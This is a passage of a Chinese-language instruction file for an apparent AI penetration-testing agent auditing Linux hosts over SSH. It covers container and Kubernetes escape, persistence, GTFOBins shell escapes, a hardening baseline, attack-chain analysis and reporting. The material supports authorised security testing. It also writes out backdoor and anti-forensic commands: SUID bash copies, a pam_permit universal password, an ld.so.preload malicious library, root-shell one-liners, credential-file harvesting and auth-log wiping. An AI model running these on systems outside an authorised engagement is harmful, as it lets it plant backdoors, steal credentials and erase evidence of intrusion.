##### VII.3 容器逃逸技术
| # | 测试点 | 逃逸方式 |
|---|--------|---------|
| 258 | 特权容器逃逸 | `--privileged` → mount 宿主机磁盘 |
| 259 | Docker Socket 利用 | 挂载 docker.sock → 创建特权容器 |
| 260 | Docker Daemon API | 未授权访问 Docker API |
| 261 | containerd 逃逸 | 利用 containerd API |
| 262 | runc 运行时逃逸 | CVE-2019-5736 等 |
| 263 | LXC/LXD 逃逸 | `lxd` 组提权 |
| 264 | cgroup 逃逸 | cgroup notify_on_release |
| 265 | 挂载逃逸 | 宿主机根目录挂载、可写 bind 挂载 |
| 266 | 命名空间逃逸 | hostPID、hostNetwork |
| 267 | 无发行版容器渗透 | 脚本语言反弹 shell、内存执行 |

##### VII.4 Kubernetes 安全
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 268 | Service Account Token | `/var/run/secrets/kubernetes.io/serviceaccount/` |
| 269 | Kubelet API | `curl -sk https://localhost:10250/pods` |
| 270 | API Server | RBAC 绕过、权限提升 |
| 271 | etcd 数据泄露 | 读取 etcd 获取所有 Secret |
| 272 | kubeconfig 文件 | `find / -name "kubeconfig" -o -path "*/.kube/config"` |

##### VII.5 镜像安全与供应链
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 273 | 镜像漏洞扫描 | `trivy image`、`grype dir:/` |
| 274 | 镜像层分析 | `docker history`、`dive` |
| 275 | 密钥与秘密泄露 | 搜索镜像中的凭据 |
| 276 | Dockerfile 审计 | `COPY` 密钥文件、`ENV` 硬编码密码 |

---

#### 类别 VIII：权限维持与后渗透持久化 `→ reference/08`（发现信号时按需加载）

> **执行策略**：本类别侧重于**检测**已有的权限维持后门，而非植入后门。若发现可疑迹象（如异常cron、非标准PAM模块、隐藏文件），深入分析其是否为已存在后门。

##### VIII.1 SUID 后门
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 277 | 复制系统二进制并设 SUID | `cp /bin/bash /tmp/.hidden && chmod 6755` |
| 278 | 编译自定义 SUID 程序 | `setuid(0); system("/bin/bash")` |

##### VIII.2 PAM 后门
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 279 | pam_permit.so 万能密码 | 在 `/etc/pam.d/sshd` 添加 `auth sufficient pam_permit.so` |
| 280 | pam_exec 密码记录 | 记录所有登录密码到日志 |
| 281 | 编译自定义 pam_unix.so | 硬编码后门密码 |

##### VIII.3 共享库注入持久化
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 282 | LD_PRELOAD | `echo "/tmp/evil.so" >> /etc/ld.so.preload` |
| 283 | ld.so.conf | 添加恶意库路径到 `/etc/ld.so.conf.d/` |
| 284 | LD_LIBRARY_PATH | 在 `.bashrc` 中设置 |

##### VIII.4 计划任务持久化
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 285 | 用户 crontab | `crontab -e` |
| 286 | 系统 crontab | `/etc/crontab`、`/etc/cron.d/` |
| 287 | Systemd 定时器 | `.timer` + `.service` 文件 |

##### VIII.5 SSH 持久化
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 288 | SSH 密钥后门 | 添加公钥到 `authorized_keys` |
| 289 | SSH 配置后门 | `PermitRootLogin yes` |

##### VIII.6 启动脚本持久化
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 290 | System V Init | `/etc/init.d/`、`/etc/rc.local` |
| 291 | Systemd 服务 | `.service` 文件 + `systemctl enable` |
| 292 | Profile 脚本 | `.bashrc`、`.profile`、`/etc/profile` |

##### VIII.7 文件隐藏技术
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 293 | 隐藏文件名 | 以 `.` 开头 |
| 294 | 不可删除标志 | `chattr +i` |
| 295 | xattr 隐藏数据 | `setfattr -n user.hidden` |

##### VIII.8 日志清理与痕迹擦除
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 296 | 清除 bash 历史 | `history -c`、`> ~/.bash_history` |
| 297 | 清除 wtmp/lastlog | `utmpdump` 编辑、`echo > /var/log/lastlog` |
| 298 | 清除特定 IP 日志 | `sed -i '/IP/d' /var/log/auth.log` |
| 299 | 安全删除 | `shred -vfz -n 5` |
| 300 | 禁用日志服务 | `systemctl stop rsyslog` |

##### VIII.9 凭据获取与利用
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 301 | 环境变量凭据 | `cat /proc/<PID>/environ` |
| 302 | Systemd 单元文件凭据 | `grep "Environment=" /etc/systemd/system/` |
| 303 | GPG 密钥 | `GNUPGHOME` 重定向解密 |
| 304 | 高价值用户文件 | `.git-credentials`、`.aws/credentials`、`.kube/config` |

##### VIII.10 高级隐蔽技术
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 305 | 进程伪装 | `prctl(PR_SET_NAME)` + argv 覆盖 |
| 306 | 单实例互斥锁 | 绑定回环端口实现单实例 |
| 307 | BPF 内核驻留后门 | BPF 套接字过滤器被动后门 |
| 308 | ICMP 中继 | 在 ICMP 有效负载中转发命令 |
| 309 | 原始套接字检测 | `ss -0pb`、`cat /proc/net/packet` |

---

#### 类别 IX：GTFOBins 速查 `→ reference/10`（发现信号时按需加载）

> **执行策略**：仅在类别 IV.2 的 SUID 扫描或类别 IV.4 的 sudo 审计发现可利用命令时，查阅本类别的对应条目。

##### IX.1 常见 SUID/特权命令利用
| # | 命令 | 利用方式 |
|---|------|---------|
| 310 | bash | `bash -p` |
| 311 | python | `python -c 'import os; os.execl("/bin/bash", "bash", "-p")'` |
| 312 | find | `find / -exec /bin/bash -p \;` |
| 313 | vim | `vim -c ':!/bin/bash'` |
| 314 | nmap | `nmap --interactive` → `!sh` |
| 315 | less/more | `!bash` |
| 316 | awk | `awk 'BEGIN {system("/bin/bash")}'` |
| 317 | man | `man man` → `!bash` |
| 318 | ftp | `!bash` |
| 319 | env | `env /bin/bash -p` |
| 320 | cp | 覆写 `/etc/passwd` 或 `/etc/shadow` |
| 321 | mv | 覆写敏感文件 |
| 322 | chmod/chown | 修改关键文件权限/属主 |
| 323 | tar/zip | 通配符注入 |
| 324 | strace | `-o /proc/self/fd/1` 读取任意文件 |
| 325 | gdb | `gdb -nx -ex '!sh' -ex quit` |
| 326 | perl | `perl -e 'exec "/bin/bash";'` |
| 327 | ruby | `ruby -e 'exec "/bin/bash"'` |
| 328 | lua | `os.execute('/bin/bash')` |
| 329 | php | `php -r "system('/bin/bash');"` |
| 330 | node | `node -e 'require("child_process").spawn("/bin/bash")'` |
| 331 | java | `Runtime.getRuntime().exec("/bin/bash")` |

##### IX.2 环境变量滥用
| # | 变量 | 利用方式 |
|---|------|---------|
| 332 | LD_PRELOAD | 加载恶意共享库 |
| 333 | LD_LIBRARY_PATH | 劫持库搜索路径 |
| 334 | PYTHONPATH | 注入恶意 Python 模块 |
| 335 | PERL5OPT | 注入 Perl 代码 |
| 336 | NODE_OPTIONS | 注入 Node.js 代码 |
| 337 | BASH_ENV | Bash 启动时执行代码 |

---

#### 类别 X：安全配置基线检查 `→ reference/09`（按需加载）

> **执行方式**：本类别以**批量扫描**为主。将多个配置检查合并为复合命令执行，汇总后分析哪些配置缺陷可与前序类别的发现形成组合利用条件。

##### X.1 密码策略合规
| # | 检查项 | 检查命令 | 判定标准 |
|---|--------|---------|---------|
| 338 | 密码加密算法 | `cat /etc/login.defs \| grep ENCRYPT_METHOD` | 应为 SHA256 或 SHA512（不接受 DES/MD5） |
| 339 | 密码最大有效期 | `cat /etc/login.defs \| grep PASS_MAX_DAYS` | ≤ 90 天 |
| 340 | 密码最小有效期 | `cat /etc/login.defs \| grep PASS_MIN_DAYS` | ≥ 1 天 |
| 341 | 密码最小长度 | `cat /etc/login.defs \| grep PASS_MIN_LEN` | ≥ 8 位 |
| 342 | 密码过期警告天数 | `cat /etc/login.defs \| grep PASS_WARN_AGE` | ≥ 7 天 |
| 343 | 密码历史限制 | `cat /etc/pam.d/system-auth \| grep pam_pwhistory` 或检查 `/etc/security/pwhistory.conf` | 记住 ≥ 5 个历史密码 |
| 344 | 空口令账户 | `awk -F: '($2 == "" \|\| $2 == "!") {print $1}' /etc/shadow` | 不应存在空口令或禁用口令为空的账户 |
| 345 | 密码复杂度要求 | 检查 pam_cracklib 或 pam_pwquality 配置 | 至少包含大小写字母+数字+特殊字符中的3类 |

##### X.2 认证配置审计
| # | 检查项 | 检查命令 | 判定标准 |
|---|--------|---------|---------|
| 346 | PAM nullok 配置 | `grep -r "nullok" /etc/pam.d/` | 不应存在 nullok（允许空密码登录） |
| 347 | PAM debug 配置 | `grep -r "debug" /etc/pam.d/` | 生产环境不应开启 debug |
| 348 | 账户锁定策略 | `cat /etc/pam.d/system-auth \| grep pam_faillock` 或 `pam_tally2` | 连续失败应锁定（≥5次失败锁定） |
| 349 | root 直接登录限制 | `cat /etc/securetty` | 应限制 root 可登录的终端 |
| 350 | su 命令限制 | `cat /etc/pam.d/su \| grep pam_wheel` | 应限制只有 wheel 组可使用 su |

##### X.3 SSH 服务加固配置
| # | 检查项 | 检查命令 | 判定标准 |
|---|--------|---------|---------|
| 351 | SSH 协议版本 | `grep -i "^Protocol" /etc/ssh/sshd_config` | 必须为 2（Protocol 1 已弃用） |
| 352 | PermitRootLogin | `grep -i "^PermitRootLogin" /etc/ssh/sshd_config` | 应为 no 或 prohibit-password |
| 353 | MaxAuthTries | `grep -i "^MaxAuthTries" /etc/ssh/sshd_config` | ≤ 5 次 |
| 354 | LoginGraceTime | `grep -i "^LoginGraceTime" /etc/ssh/sshd_config` | ≤ 60 秒 |
| 355 | AllowUsers/AllowGroups | `grep -i "^AllowUsers\|^AllowGroups" /etc/ssh/sshd_config` | 应配置白名单限制登录用户 |
| 356 | SSH Banner | `grep -i "^Banner" /etc/ssh/sshd_config` | 应配置登录警告信息 |
| 357 | 空密码登录 | `grep -i "^PermitEmptyPasswords" /etc/ssh/sshd_config` | 必须为 no |
| 358 | X11 转发 | `grep -i "^X11Forwarding" /etc/ssh/sshd_config` | 生产环境应为 no |
| 359 | SSH 密钥权限 | `ls -la ~/.ssh/` | 私钥 600，公钥 644，.ssh 目录 700 |
| 360 | 弱加密算法 | `grep -i "^Ciphers\|^MACs\|^KexAlgorithms" /etc/ssh/sshd_config` | 不应包含 arcfour/blowfish-cbc 等弱算法 |

##### X.4 网络内核参数安全
| # | 检查项 | 检查命令 | 判定标准 |
|---|--------|---------|---------|
| 361 | IP 转发 | `cat /proc/sys/net/ipv4/ip_forward` | 非路由器应为 0 |
| 362 | ICMP 重定向 | `cat /proc/sys/net/ipv4/conf/all/accept_redirects` | 应为 0（不接受 ICMP 重定向） |
| 363 | 发送 ICMP 重定向 | `cat /proc/sys/net/ipv4/conf/all/send_redirects` | 应为 0 |
| 364 | SYN Cookie 防护 | `cat /proc/sys/net/ipv4/tcp_syncookies` | 应为 1（防 SYN flood） |
| 365 | 源路由 | `cat /proc/sys/net/ipv4/conf/all/accept_source_route` | 应为 0（禁用源路由） |
| 366 | 反向路径过滤 | `cat /proc/sys/net/ipv4/conf/all/rp_filter` | 应为 1（防 IP 欺骗） |
| 367 | 记录 Martian 包 | `cat /proc/sys/net/ipv4/conf/all/log_martians` | 应为 1 |
| 368 | TCP 时间戳 | `cat /proc/sys/net/ipv4/tcp_timestamps` | 安全需求高时应为 0（防序列号预测） |

##### X.5 服务最小化检查
| # | 检查项 | 检查命令 | 判定标准 |
|---|--------|---------|---------|
| 369 | Telnet 服务 | `systemctl is-enabled telnet.socket 2>/dev/null` | 应为 disabled 或不存在 |
| 370 | RSH/Rlogin | `systemctl is-enabled rsh.socket 2>/dev/null` | 应为 disabled 或不存在 |
| 371 | TFTP 服务 | `systemctl is-enabled tftp.socket 2>/dev/null` | 应为 disabled 或不存在 |
| 372 | NIS/YP 服务 | `systemctl is-enabled ypbind.service 2>/dev/null` | 应为 disabled 或不存在 |
| 373 | FTP 服务（非 SFTP） | `systemctl is-enabled vsftpd.service 2>/dev/null` | 应使用 SFTP 替代，明文 FTP 应禁用 |
| 374 | 不必要监听端口 | `ss -tlnp \| grep -vE ':(22\|80\|443)\s'` | 列出非标准端口，逐一评估必要性 |

##### X.6 审计与日志配置
| # | 检查项 | 检查命令 | 判定标准 |
|---|--------|---------|---------|
| 375 | auditd 服务状态 | `systemctl is-enabled auditd` | 应为 enabled |
| 376 | 审计规则完整性 | `auditctl -l 2>/dev/null \| wc -l` | 应 ≥ 10 条关键审计规则 |
| 377 | 用户操作审计 | `auditctl -l 2>/dev/null \| grep -E "execve\|connect\|open"` | 应监控关键系统调用 |
| 378 | 日志文件权限 | `ls -la /var/log/messages /var/log/secure /var/log/auth.log 2>/dev/null` | 应为 640 或更严格 |
| 379 | 日志集中管理 | `grep -E "^*.*@" /etc/rsyslog.conf 2>/dev/null` 或检查 syslog-ng 配置 | 关键日志应发送到远程日志服务器 |
| 380 | 日志轮转配置 | `cat /etc/logrotate.conf \| grep -E "rotate\|maxage"` | 应配置合理的轮转策略（保留 ≥ 90 天） |
| 381 | 登录失败记录 | `grep "Failed password" /var/log/secure 2>/dev/null \| wc -l` | 应有登录失败记录（证明审计有效） |

##### X.7 引导安全
| # | 检查项 | 检查命令 | 判定标准 |
|---|--------|---------|---------|
| 382 | GRUB 配置权限 | `ls -la /boot/grub2/grub.cfg` 或 `/boot/grub/grub.cfg` | 应为 600 或更严格 |
| 383 | GRUB 配置属主 | `stat -c '%U:%G' /boot/grub2/grub.cfg 2>/dev/null` | 应为 root:root |
| 384 | 引导密码保护 | `grep -i "password" /boot/grub2/grub.cfg 2>/dev/null` 或 `cat /boot/grub2/user.cfg 2>/dev/null` | 应配置引导密码（防单用户模式提权） |
| 385 | 单用户模式认证 | `grep -i "SINGLE\|sulogin" /etc/sysconfig/init 2>/dev/null` 或检查 systemd rescue.target | 单用户模式应要求 root 密码 |

##### X.8 系统安全配置
| # | 检查项 | 检查命令 | 判定标准 |
|---|--------|---------|---------|
| 386 | 全局 umask 设置 | `cat /etc/profile \| grep umask` 或 `grep -r "umask" /etc/profile.d/` | 应为 027 或 077 |
| 387 | root umask | `grep "umask" /root/.bashrc /root/.bash_profile 2>/dev/null` | 应为 027 或 077 |
| 388 | 登录 Banner 警告 | `cat /etc/issue` 和 `cat /etc/issue.net` | 应有未授权访问警告信息 |
| 389 | Coredump 限制 | `grep -i "hard.*core" /etc/security/limits.conf` | 应为 0 或限制 coredump |
| 390 | 时间同步服务 | `systemctl is-enabled chronyd 2>/dev/null` 或 `systemctl is-enabled ntpd 2>/dev/null` | 应启用时间同步（日志时间戳准确性） |
| 391 | 文件完整性工具 | `command -v aide tripwire 2>/dev/null` | 应部署文件完整性检查工具 |
| 392 | 关键目录权限 | `ls -ld /tmp /var/tmp /var/log` | /tmp 1777，/var/tmp 1777，/var/log 750 |

**类别 X 批量扫描要点：**
- 将 X.1~X.5 合并为1~2条复合命令批量执行
- X.6~X.8 根据需要决定是否执行
- 发现配置缺陷后，分析其是否与前序类别的发现形成组合利用条件
- 例如：空口令（X.1）+ SSH PermitRootLogin=yes（X.3）= 直接远程root

---

### 2.4 阶段三：跨类别组合分析

阶段二完成后，从全局视角分析跨类别的关联和组合。

#### 组合分析内容

1. **攻击链构建**：检查多个类别的发现是否可串联为完整攻击路径
   - 例：弱口令（类别II）+ MySQL UDF（类别III）= 远程代码执行
   - 例：Cron 可写脚本（类别IV）+ SUID 程序（类别IV）= root 提权
2. **权限提升路径分析**：基于当前权限，串联所有可利用条件，找到最短提权路径
3. **横向移动可行性**：基于网络信息（类别I）和服务暴露（类别III），评估横向移动可能性
4. **防御绕过评估**：针对发现的安全措施（SELinux/AppArmor/防火墙），评估绕过可能性

选取最高价值的一条攻击链进行端到端验证。**每确认一个漏洞，立即按 §5.1 格式实时打印。**

### 2.5 阶段四：补漏

1. **版本 CVE 检查**：基于已收集的软件版本信息，查询已知 CVE
2. **组合攻击链分析**：检查多个低危发现是否可组合为高危利用路径
3. **遗漏检查**：回顾阶段二中跳过的项目，确认是否真的不适用

## 3. 参考文档按需加载

### 3.1 文档索引

| 文件 | 主题 | 加载时机 |
|------|------|---------|
| reference/01 | Linux 基础与信息收集 | 类别 I 执行时按需参考 |
| reference/02 | 身份鉴别与认证绕过 | 类别 II 发现信号时 |
| reference/03 | 服务与软件漏洞利用 | 类别 III 发现信号时 |
| reference/04 | 本地权限提升与配置缺陷 | 类别 IV 发现信号时 |
| reference/05 | 运行时注入与劫持 | 类别 V 发现信号时 |
| reference/06 | 本地 IPC 通信安全 | 类别 VI 发现信号时 |
| reference/07 | 容器与虚拟化逃逸 | 类别 VII 发现信号时 |
| reference/08 | 权限维持与后渗透持久化 | 类别 VIII 发现信号时 |
| reference/09 | 安全配置检查基线 | 类别 X 执行时按需加载 |
| reference/10 | GTFOBins 速查 | 类别 IX 发现信号时 |
| reference/11 | 漏洞挖掘测试清单 | 需要测试思路参考时 |
| reference/report-template.md | 报告模板 | 启动时阅读 |
| reference/examples-deep-analysis.md | 深度分析示例 | 需要参考分析方法时 |

### 3.2 加载策略

- **启动时**：仅阅读 `reference/report-template.md`
- **执行中按需加载**：遇到相关信号时，用 `read_file` 读取对应参考文档的**相关章节**，每次不超过 100 行
- **不预加载全量文档**：避免占用上下文空间，只在需要时读取

## 4. 命令执行规范

### 4.1 SSH 执行格式

```bash
ssh {{username}}@{{target_ip}} "command"
```

| 占位符 | 说明 |
|-------|------|
| `{{target_ip}}` | 目标主机 IP |
| `{{username}}` | SSH 用户名 |
| `{{password}}` | SSH 密码 |

### 4.2 批量执行优化

```bash
# 示例：将同一类别的多条命令合并为一条复合命令
ssh {{username}}@{{target_ip}} "cat /etc/login.defs 2>/dev/null | grep -E 'ENCRYPT_METHOD|PASS_MAX|PASS_MIN|PASS_WARN|PASS_LEN' && echo '---SEP---' && grep -r 'nullok\|debug' /etc/pam.d/ 2>/dev/null && echo '---SEP---' && cat /etc/pam.d/su 2>/dev/null | grep pam_wheel"
```

### 4.3 远程 Kali 执行模式（ssh_remote）

当 `KALI_MODE: "ssh_remote"` 时，Skill 运行在非 Kali 主机上，需要 Kali 工具链的命令通过 SSH 转发到远程 Kali 跳板机执行。

#### 执行路由规则

| 命令类型 | 执行位置 | 说明 |
|---------|---------|------|
| 目标机信息收集 | → 目标机（SSH） | `ssh {{username}}@{{target_ip}} "..."` |
| 目标机漏洞利用 | → 目标机（SSH） | 同上 |
| 需要 Kali 工具链 | → 远程 Kali（SSH） | `sshpass -p '{password}' ssh {user}@{host} '...'` |
| 需要文件传输 | → scp 传输 | 通过 scp 在 Kali 与目标机之间传递文件 |

#### Kali 工具链识别

以下操作需要路由到远程 Kali 执行：
- `nmap`、`masscan`、`nikto`、`sqlmap`、`hydra`、`john`、`hashcat` 等扫描/破解工具
- `msfconsole`、`msfvenom` 等 Metasploit 工具
- `searchsploit`、`exploitdb` 查询
- Python/Ruby 渗透脚本（需要 Kali 环境依赖）
- 编译exploit（需要 Kali 上的交叉编译工具链）

#### 远程执行命令格式

```bash
# 密码认证
sshpass -p '{kali_password}' ssh -p {kali_port} {kali_user}@{kali_host} \
  {ssh_options} '{command}'

# 密钥认证
ssh -i {key_path} -p {kali_port} {kali_user}@{kali_host} \
  {ssh_options} '{command}'

# 文件传输：Kali → 目标机
sshpass -p '{kali_password}' scp -P {kali_port} {kali_user}@{kali_host}:{remote_path} {local_path}

# 文件传输：本地 → Kali
sshpass -p '{kali_password}' scp -P {kali_port} {local_path} {kali_user}@{kali_host}:{remote_path}
```

#### 上下文变量

`config.yaml` 中的 `REMOTE_KALI` 配置会被解析为以下变量，在命令中直接引用：

| 变量 | 来源 | 示例 |
|------|------|------|
| `{{kali_host}}` | REMOTE_KALI.host | 192.168.1.100 |
| `{{kali_port}}` | REMOTE_KALI.port | 22 |
| `{{kali_user}}` | REMOTE_KALI.user | kali |
| `{{kali_password}}` | REMOTE_KALI.password | （敏感，不写入报告） |
| `{{kali_key_path}}` | REMOTE_KALI.key_path | ~/.ssh/id_rsa |
| `{{kali_ssh_options}}` | REMOTE_KALI.ssh_options | -o StrictHostKeyChecking=no |

#### 前置检查

在 `ssh_remote` 模式下，阶段一环境画像之前，先执行连通性验证：

```bash
# 验证 Kali 跳板机可达
sshpass -p '{password}' ssh -p {port} {user}@{host} \
  -o ConnectTimeout=10 'echo "KALI_OK" && uname -a && which nmap msfconsole'
```

验证失败则报错退出，不继续执行。

### 4.4 清理

测试完成后清理临时文件：
```bash
ssh {{username}}@{{target_ip}} "rm -rf /tmp/.pentest"
```

## 5. 报告规范

### 5.1 实时打印

每确认一个漏洞，立即输出：

```
【漏洞确认】VULN-XXX
漏洞类型: [提权/认证绕过/信息泄露/...]
风险等级: [高危/中危/低危]
漏洞点: [具体文件/服务/配置路径]
触发条件: [前置条件]
关键证据: [命令 + 输出摘要]
利用结果: [成功/失败 + 原因]
修复建议: [具体操作]
---
```

### 5.2 最终报告

测试完成后输出完整中文报告，结构如下：

```
一、执行摘要
  - 测试目标与范围
  - 总体安全评估
  - 关键发现摘要

二、目标环境信息
  - OS、内核、架构、运行服务

三、测试覆盖统计
  - 总测试点数 / 已检查数 / 发现信号数 / 跳过数
  - 各类别覆盖情况

四、漏洞详情
  - 每个漏洞的完整信息（参考 reference/report-template.md）

五、攻击路径分析
  - 可组合漏洞的攻击链

六、风险等级汇总
  - 高/中/低危分类统计

七、修复建议优先级
  - 紧急/重要/建议三级排列
```

报告详细格式参考 `reference/report-template.md`。

## 6. 决策指南

### 6.1 批量扫描 vs 深度分析的判定

| 测试点性质 | 执行方式 | 示例 |
|-----------|---------|------|
| 纯信息采集 | 批量扫描，汇总分析 | uname -r、cat /etc/passwd、hostname |
| 配置合规检查 | 批量扫描，异常项深入 | 密码策略、SSH加固、内核参数 |
| 潜在漏洞探测 | 深度分析 + 利用验证 | SUID利用、服务漏洞、提权路径 |
| 已知CVE匹配 | 版本比对即可 | 内核版本、软件版本对应的CVE |

### 6.2 环境自适应跳过规则

根据环境画像自动决策：
- **非容器环境** → 跳过类别VII
- **无数据库服务** → 跳过类别III.1
- **无 Web 服务** → 跳过类别III.2
- **非 Kerberos 环境** → 跳过类别II.6
- **SELinux=Disabled** → 简化IV.10 中 SELinux 相关检查

跳过时记录原因：`⏭️ 跳过：[类别/测试点] — 环境不支持（[具体原因]）`

### 6.3 上下文管理

- 大量输出写入 `/tmp/.pentest/` 下的文件，用 grep 提取关键信息
- 每个测试类别的分析结论（发现的安全问题和确认安全的理由）必须保留
- 不在上下文中保留完整的原始命令输出